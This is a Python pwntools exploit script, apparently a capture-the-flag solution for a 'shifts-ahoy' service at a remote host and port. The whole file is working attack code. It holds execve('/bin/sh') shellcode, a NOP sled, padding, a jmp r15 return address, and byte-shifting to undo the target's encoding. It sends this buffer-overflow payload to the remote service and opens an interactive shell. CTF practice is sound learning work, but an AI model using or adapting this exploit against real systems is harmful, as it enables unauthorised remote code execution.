#!/usr/bin/python

from pwn import *


jmpR15 = p64(0x00000000004011cd)
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print "shellcode is of length : ", len(shellcode)

#p = process("./shifts-ahoy")
p = remote("jh2i.com" ,50015)


payload = "\x90"*8 + shellcode + "M"*(80 - len(shellcode) - 8) + "M"*8 + jmpR15 

payload2 = ""

for i in range(64):
    if payload[i] == "\x0f":
        payload2 += "\x02"
    elif payload[i] == "\x05":
        payload2 += "\xf8"
    else:
        payload2 += chr(ord(payload[i]) - 0xd)


payload2 += payload[64::]

p.recvuntil("> ")

p.sendline("1")

p.recvuntil("Enter the message: ")

#gdb.attach(p)

p.sendline(payload2)

p.interactive()

